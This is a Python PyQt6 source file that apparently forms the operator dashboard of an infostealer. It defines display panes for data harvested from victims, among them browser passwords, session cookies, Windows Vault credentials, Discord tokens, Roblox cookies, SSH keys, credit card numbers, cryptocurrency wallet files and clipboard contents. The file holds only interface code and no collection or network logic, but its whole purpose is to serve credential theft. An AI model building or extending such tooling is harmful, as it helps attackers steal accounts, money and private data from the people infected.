# ui/data_harvest_pane.py (Full Code - Reworked for New API Model)
from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QListWidget, QStackedWidget, 
                             QVBoxLayout, QTableWidget, QTextEdit, 
                             QHeaderView, QTableWidgetItem, QAbstractItemView, QSizePolicy)
from PyQt6.QtCore import Qt
import json

class DataHarvestPane(QWidget):
    def __init__(self):
        super().__init__()
        
        main_layout = QHBoxLayout(self)
        
        self.category_list = QListWidget()
        self.category_list.setFixedWidth(240)
        self.category_list.setSizePolicy(QSizePolicy.Policy.Fixed, QSizePolicy.Policy.Expanding)
        
        # --- List matches the 29 fields requested ---
        self.categories = [
            "System Info", "Hardware Info", "Security Products", "Installed Applications", 
            "Running Processes", "Environment Variables", "Network Info", "Wi-Fi Passwords", 
            "Active Connections", "ARP Table", "DNS Cache", "Browser Passwords", 
            "Session Cookies", "Windows Vault Credentials", "Application Credentials", 
            "Discord Tokens", "Roblox Cookies", "SSH Keys", "Telegram Session Files", 
            "Credit Card Data", "Cryptocurrency Wallet Files", "Browser Autofill", 
            "Browser History", "Clipboard Contents"
        ]
        self.category_list.addItems(self.categories)
        main_layout.addWidget(self.category_list)
        
        self.content_stack = QStackedWidget()
        main_layout.addWidget(self.content_stack, 1)
        
        # --- Map the module_name from the payload to the UI widget ---
        self.view_map = {
            "System Info": self._create_text_view(),
            "Hardware Info": self._create_text_view(),
            "Security Products": self._create_text_view(),
            "Installed Applications": self._create_text_view(is_mono=True),
            "Running Processes": self._create_text_view(is_mono=True),
            "Environment Variables": self._create_text_view(is_mono=True),
            "Network Info": self._create_text_view(),
            "Wi-Fi Passwords": self._create_table(["SSID", "Password"]),
            "Active Network Connections": self._create_text_view(is_mono=True),
            "ARP Table (Local Network Devices)": self._create_text_view(is_mono=True),
            "DNS Cache": self._create_text_view(is_mono=True),
            "Browser Passwords": self._create_table(["Browser", "Profile", "URL", "Username", "Password"]),
            "Session Cookies": self._create_table(["Host", "Name", "Expires (UTC)", "Value"]),
            "Windows Vault Credentials": self._create_table(["Resource", "Username", "Password"]),
            "Application Credentials (e.g., FileZilla)": self._create_table(["Host", "Port", "Username", "Password"]),
            "Discord Tokens": self._create_text_view(is_mono=True),
            "Roblox Cookies": self._create_text_view(is_mono=True),
            "SSH Keys": self._create_text_view(is_mono=True),
            "Telegram Session Files": self._create_text_view(),
            "Credit Card Data": self._create_table(["Name on Card", "Expires (MM/YY)", "Card Number"]),
            "Cryptocurrency Wallet Files": self._create_text_view(is_mono=True),
            "Browser Autofill Data": self._create_table(["Field Name", "Value"]),
            "Browser History": self._create_table(["URL", "Title", "Visit Count", "Last Visit (UTC)"]),
            "Clipboard Contents": self._create_text_view(is_mono=True),
        }

        # Match list order to view_map keys
        self.ordered_keys = [
            "System Info", "Hardware Info", "Security Products", "Installed Applications", 
            "Running Processes", "Environment Variables", "Network Info", "Wi-Fi Passwords", 
            "Active Network Connections", "ARP Table (Local Network Devices)", "DNS Cache", "Browser Passwords", 
            "Session Cookies", "Windows Vault Credentials", "Application Credentials (e.g., FileZilla)", 
            "Discord Tokens", "Roblox Cookies", "SSH Keys", "Telegram Session Files", 
            "Credit Card Data", "Cryptocurrency Wallet Files", "Browser Autofill Data", 
            "Browser History", "Clipboard Contents"
        ]

        for key in self.ordered_keys:
            self.content_stack.addWidget(self.view_map[key])

        self.category_list.currentItemChanged.connect(self.on_category_change)
        if self.category_list.count() > 0: self.category_list.setCurrentRow(0)

    def on_category_change(self, current_item):
        if not current_item: return
        selected_key = self.ordered_keys[self.category_list.row(current_item)]
        self.content_stack.setCurrentWidget(self.view_map[selected_key])

    def _create_text_view(self, is_mono=False):
        text_edit = QTextEdit(); text_edit.setReadOnly(True)
        if is_mono: text_edit.setFontFamily("Consolas")
        return text_edit

    def _create_table(self, headers):
        table = QTableWidget(); table.setColumnCount(len(headers)); table.setHorizontalHeaderLabels(headers)
        table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents); table.horizontalHeader().setStretchLastSection(True)
        table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers); table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        table.verticalHeader().setVisible(False); table.setSortingEnabled(True)
        return table

    def clear_all_views(self):
        for view in self.view_map.values():
            if isinstance(view, QTextEdit): view.setText("Awaiting data...")
            elif isinstance(view, QTableWidget): view.setRowCount(0)

    def update_view(self, module_name, data):
        view = self.view_map.get(module_name)
        if not view: return

        if data.get("status") == "error":
            if isinstance(view, QTextEdit):
                view.setText(f"Error harvesting this module:\n\n{data.get('data', 'No details provided.')}")
            return

        payload = data.get('data')
        if isinstance(view, QTextEdit):
            self._populate_text_view(view, payload)
        elif isinstance(view, QTableWidget):
            self._populate_table(view, payload)

    def _populate_text_view(self, view, data):
        if not data: view.setText("No data found."); return
        if isinstance(data, dict):
            html = "".join([f"<p><b>{key.replace('_', ' ').title()}:</b> {value}</p>" for key, value in data.items()])
            view.setHtml(html)
        elif isinstance(data, list):
             view.setText("\n".join(data))
        else:
            view.setText(str(data))

    def _populate_table(self, table, data_list):
        if not isinstance(data_list, list) or not data_list: table.setRowCount(0); return
        table.setRowCount(len(data_list))
        for row_idx, row_data in enumerate(data_list):
            if isinstance(row_data, list):
                 for col_idx, cell_data in enumerate(row_data): table.setItem(row_idx, col_idx, QTableWidgetItem(str(cell_data)))
            elif isinstance(row_data, dict): # For lists of dicts like Installed Apps
                 for col_idx, header in enumerate([table.horizontalHeaderItem(i).text() for i in range(table.columnCount())]):
                     table.setItem(row_idx, col_idx, QTableWidgetItem(str(row_data.get(header.lower(), 'N/A'))))

        table.resizeColumnsToContents()